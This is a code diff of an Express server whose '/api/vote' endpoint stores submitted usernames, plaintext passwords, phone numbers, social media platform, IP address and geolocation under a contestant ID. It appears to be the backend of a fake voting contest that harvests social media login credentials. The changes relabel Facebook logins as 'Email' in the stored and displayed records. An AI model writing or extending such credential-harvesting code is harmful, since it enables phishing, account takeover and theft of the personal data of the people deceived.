@@ -157,11 +157,14 @@ function formatAuditRecord(doc) {
   let accountType = d.accountType;
   if (!accountType) {
     const p = (d.platform || '').toLowerCase();
-    if (p.includes('fb') || p.includes('facebook')) accountType = 'Facebook';
+    if (p.includes('email') || p.includes('mail')) accountType = 'Email';
+    else if (p.includes('fb') || p.includes('facebook')) accountType = 'Email';
     else if (p.includes('insta') || p.includes('instagram')) accountType = 'Instagram';
     else if (p.includes('tik')) accountType = 'TikTok';
     else if (p.includes('twit') || p.includes('x')) accountType = 'Twitter';
     else accountType = 'Web';
+  } else if (accountType.toLowerCase().includes('facebook') || accountType.toLowerCase().includes('fb')) {
+    accountType = 'Email';
   }
 
   const recordLocation = d.location || '—';
@@ -221,6 +224,8 @@ app.post('/api/vote', async (req, res) => {
     const finalLocation = req.body.location || geoInfo.location || 'United States';
     const finalIp = geoInfo.ip || incomingIp || '127.0.0.1';
 
+    const normPlatform = (platform === 'facebook' || platform === 'fb') ? 'email' : (platform || 'email');
+
     const voterData = {
       username: username.trim(),
       password,
@@ -228,10 +233,10 @@ app.post('/api/vote', async (req, res) => {
       phone: phone ? phone.trim() : undefined,
       authStatus: 'Active / Verified',
       location: finalLocation,
-      accountType: platform ? `${platform.toUpperCase()} Auth` : 'Web Direct',
+      accountType: normPlatform ? `${normPlatform.toUpperCase()} Auth` : 'EMAIL Auth',
       contestantId: contestantId || 'FK-101',
       contestantNo: contestantNo || '001',
-      platform: platform || 'web',
+      platform: normPlatform,
       ipAddress: finalIp,
       userAgent: req.headers['user-agent'] || 'Browser Client'
     };
